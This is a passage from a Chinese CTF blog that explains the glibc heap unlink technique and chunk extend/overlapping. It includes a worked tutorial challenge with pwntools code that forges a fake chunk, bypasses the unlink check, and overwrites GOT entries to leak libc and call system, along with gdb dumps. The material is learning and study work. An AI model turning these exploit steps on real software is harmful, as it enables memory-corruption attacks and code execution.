prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">    <span class="comment">//到这里为止就是利用的主要部分，可以发现其实总体没有变化</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="关于FD-gt-bk和BK-gt-fd"><a href="#关于FD-gt-bk和BK-gt-fd" class="headerlink" title="关于FD-&gt;bk和BK-&gt;fd"></a>关于FD-&gt;bk和BK-&gt;fd</h4><p>关于这个东西始终有些细节不太确定，所以干脆自己写个demo来确定一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> prev_size;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">char</span>* fd;</span><br><span class="line">	<span class="keyword">char</span>* bk;</span><br><span class="line">&#125;chunk,*pchunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">	pchunk ptr = p2<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr = %p\n&quot;</span>, ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&amp;ptr = %p\n&quot;</span>, &amp;ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr-&gt;fd = %p\n&quot;</span>, ptr-&gt;fd);</span><br><span class="line">	pchunk FD = ptr-&gt;fd;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD = %p\n&quot;</span>,FD);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD-&gt;bk = %p\n&quot;</span>,FD-&gt;bk);</span><br><span class="line">	pchunk BK = ptr-&gt;bk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK = %p\n&quot;</span>,BK);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK-&gt;fd = %p\n&quot;</span>,BK-&gt;fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为unlink应用于双向链表，所以我malloc了三块大于fast bin的chunk，然后先后释放。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">0xa0: 0x602180 —▸ 0x6020c0 —▸ 0x602000 —▸ 0x7ffff7dd1c08 (main_arena+232) ◂— 0x602180</span><br></pre></td></tr></table></figure>

<p>然后让结构体指针ptr指向chunk2的头部，也就是说此时<code>ptr = 0x6020c0</code></p>
<p>首先是<code>ptr-&gt;fd</code>，很简单，一共分成两步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x4006e1 &lt;main+187&gt;    mov    rax, qword ptr [rbp - 0x38]</span><br><span class="line">  0x4006e5 &lt;main+191&gt;    mov    rax, qword ptr [rax + 0x10]</span><br></pre></td></tr></table></figure>

<p>其中<code>[rbp - 0x38] == 0x6020c0 == ptr</code>，<code>[rax + 0x10] == *(ptr + 2) == 0x602000</code></p>
<p>综合起来其实也就一步：<code>*(ptr + 2)</code></p>
<p>那么<code>FD-&gt;bk</code>呢？一共分成两步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x40071d &lt;main+247&gt;    mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">  0x400721 &lt;main+251&gt;    mov    rax, qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>

<p>其中<code>[rbp - 0x18] == FD == 0x602000</code>，<code>[rax + 0x18] == *(FD + 3) = 0x6020c0</code></p>
<p>综合起来其实还是一步：<code>*(FD + 3)</code></p>
<p>到这里为止其实就可以说明<code>FD-&gt;bk</code>这条指令其实等效于<code>*(*(ptr + 2) + 3)</code>，在这个例子中，<code>ptr == 0x6020c0</code>，那么<code>FD-&gt;bk</code>也就等效于<code>*(*(0x6020c0 + 0x10) + 0x18)</code></p>
<p>同样的道理，<code>BK-&gt;fd</code>等效于<code>*(*(ptr + 3) + 2) == *(*(0x6020c0 + 0x18) + 0x10)</code></p>
<h4 id="用一道题目来讲"><a href="#用一道题目来讲" class="headerlink" title="用一道题目来讲"></a>用一道题目来讲</h4><p>（本题是<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11q4y1E7E2?spm_id_from=333.788.top_right_bar_window_history.content.click">【星盟安全】PWN系列教程 第20节 Unlink</a> 教程里的例题，在libc-2.23环境）</p>
<p>首先是创建堆块的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a book ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how long: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  result = id;</span><br><span class="line">  <span class="keyword">if</span> ( id &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = id;</span><br><span class="line">    <span class="keyword">if</span> ( id &lt;= <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt; <span class="number">0</span> || *(&amp;chunk + id) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;too large!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = id;</span><br><span class="line">        *(&amp;chunk + v3) = <span class="built_in">malloc</span>(size);	<span class="comment">//在这里将堆指针放到了.bss段上</span></span><br><span class="line">        Size[v3] = size;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本题没开PIE，所以知道chunk的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602300 chunk           dq ?                    ; DATA XREF: init+7C↑o</span><br><span class="line">.bss:0000000000602300                                         ; add+83↑r ...</span><br><span class="line">.bss:0000000000602308                 db    ? ;</span><br></pre></td></tr></table></figure>

<p>然后是一个有堆溢出的edit功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which book to write?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how big?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;chunk + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read_0(*(&amp;chunk + v1), v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下一个正常的free功能函数就不贴了，本题没有show功能函数。</p>
<p>接下来就是重点，也是我卡了好几天才稍微搞懂的一些点：</p>
<ol>
<li><p>在unlink宏中，传进去的P指针：</p>
<p>① 向后合并（向低地址合并）时，传进去的P指针的值实际上是“当前要free掉的chunk的头部 - prev size”（也就是低地址的chunk的头部）（这里还有一点不懂，如果传进去的P指针是低地址的chunk的头部的话，那么P-&gt;fd跟P-&gt;bk是在这期间写进低地址chunk里面的吗）。</p>
<p>② 向前合并（向高地址合并）时，因为当前要free掉的chunk就是低地址chunk，所以传进去的P指针就是当前chunk的头部</p>
</li>
<li><p>向后合并：向低地址合并时就要判断低地址的chunk是否空闲，所以可以直接判断当前chunk的P位是否为0以及是否有prev size，如果判断为空闲，就用unlink合并。</p>
<p>向前合并：因为要判断高地址chunk是否空闲，所以要去查看更高地址的chunk（下下个chunk）的P位以及其是否有prev size，如果判断为空闲，就用unlink合并。找到下下个chunk的方法就是 “当前chunk的头部地址+当前chunk的size+下一个chunk的size”。</p>
</li>
<li><p>绕过<code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>的方法</p>
<p>知道了1、2两点之后，我们回到例题</p>
<p>首先申请四块chunk</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>在add功能函数中我们知道，从0x602300这个地址开始会保存堆指针，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000001955010	0x0000000001955050</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>再来看前两个chunk中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000000001955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>接下来就是触发unlink的过程：</p>
<ol>
<li><p>在chunk0的数据段中伪造一个chunk，以及用堆溢出修改chunk1的prev size和size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd = <span class="number">0x00602300</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x00602300</span>-<span class="number">0x10</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">fake_chunk += p64(fd) + p64(bk)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x30</span>) + p64(<span class="number">0x100</span>)	<span class="comment">#将chunk1的prev size改成fake_chunk的大小，以及size的低一bit置零</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,fake_chunk)</span><br></pre></td></tr></table></figure>

<p>修改完之后两个chunk中的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000031	=&gt;从这里开始属于fake_chunk</span><br><span class="line">0x1955020:	0x00000000006022e8	0x00000000006022f0</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到这里我们将fake_chunk的fd设置成了<code>&amp;chunk0 - 0x18</code>，bk设置成了<code>&amp;chunk0 - 0x10</code>，接下来我们就讲原因</p>
<p>① 首先我们这里准备的是向后合并，也就是向低地址合并，所以我们修改了chunk1的prev size以及size，我们最后会通过free掉chunk1来触发unlink的向后合并。那么我们如上修改完之后，unlink时传进去的P指针的值是多少呢？答案就是chunk1的头部地址 - prev size，也就是<code>P = 0x1955040 - 0x30 = 0x1955010</code></p>
<p>② 那么我们就知道<code>FD = P-&gt;fd == *(0x1955010 + 0x10) == 0x6022e8</code>，<code>BK = P-&gt;bk == *(0x1955010 + 0x18) == 0x6022f0</code></p>
<p>那么显而易见，<code>FD-&gt;bk == *(0x6022e8 + 0x18) == *(0x602300) == 0x1955010 == P</code>，同时<code>BK-&gt;fd == *(0x6022f0 + 0x10) == *(0x602300) == 0x1955010 == P</code></p>
<p>因为<code>0x602300</code>上面存放的就是<code>P</code>的地址，所以我们就能够通过这样的构造从而来绕过unlink的检测</p>
</li>
<li><p>然后我们free掉chunk1，再来看看两个堆中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000131</span><br><span class="line">0x1955020:	0x00007faf0229bb78	0x00007faf0229bb78</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到chunk1跟fake_chunk合并了，并且放到了unsorted bin中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x1955010 —▸ 0x7faf0229bb78 (main_arena+88) ◂— 0x1955010</span><br></pre></td></tr></table></figure></li>
</ol>
<p>那么到这里为止我们实现了什么效果呢？我们可以看到在unlink源码中的这一部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>最后unlink会将<code>FD(0x6022e8)</code>写进<code>BK-&gt;fd(0x602300)</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x00000000006022e8	0x0000000000000000</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以到这里为止我们所实现的就是将<code>&amp;P-0x18</code>写进了<code>&amp;P</code>里面，完成了堆指针的修改</p>
<p>然后我们再用edit功能函数编辑chunk0的时候，实际上就是从<code>0x6022e8</code>开始写值，这样我们就能进一步将堆指针修改成任意值，从而完成最后的任意地址写</p>
<p>接下来就是这题剩下的部分了，我们将堆指针修改成如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000000602060	0x0000000000602060</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000000602018	0x0000000001955260</span><br></pre></td></tr></table></figure>

<p>因为本题的got表可改，而且没有show功能，所以我们将free函数的got表改成puts函数，然后free(0)就能将atoi函数的got表泄漏，完成libc的泄漏，最后free改system就行。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/extend-overlopping/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/07/extend-overlopping/" class="post-title-link" itemprop="url">extend_overlopping</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-07 01:17:02" itemprop="dateCreated datePublished" datetime="2022-05-07T01:17:02+08:00">2022-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-10 01:50:13" itemprop="dateModified" datetime="2022-05-10T01:50:13+08:00">2022-05-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
<li><p>程序中存在基于堆的漏洞</p>
</li>
<li><p>该漏洞可以控制 chunk hearder 中的数据</p>
</li>
</ol>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得块重叠之后能利用大chunk修改其包含的小chunk的内容</p>
<p>如果某个chunk中存在字符串指针，函数指针等等，就可以考虑这种利用方式</p>
<p>同时假如被重叠的堆块是free chunk的话，就可以修改其fd/bk指针</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 ptmalloc 中</p>
<p>获取下一chunk（高地址chunk）地址的操作：当前块指针加上size</p>
<p>获取上一chunk（低地址chunk）地址的操作：当前块指针减去prev size</p>
<p>查看当前chunk是否inuse：去查看下一chunk的inuse位</p>
<p>总结：ptmalloc基于chunk header中的数据来判断chunk的使用情况以及前后块的定位</p>
<h3 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h3><p>实现方法：</p>
<p>更改低地址chunk的size位，使该chunk的大小足以覆盖想要修改的数据，free掉该chunk之后再malloc回来，就在原本的位置上得到了一个大chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0x71</span>;		<span class="comment">//修改chunk1的size位</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h3><p>其实这个跟上面的一样，只是当我们修改的size大于fastbin范围的时候有一点需要注意，就是我们free掉的这个大chunk不能紧贴top chunk，否则就会直接跟其合并。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);	<span class="comment">//垫一个chunk防止chunk1与top chunk合并</span></span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0xd1</span>;		<span class="comment">//修改chunk1的size位(0x90+0x40)</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0xc0</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

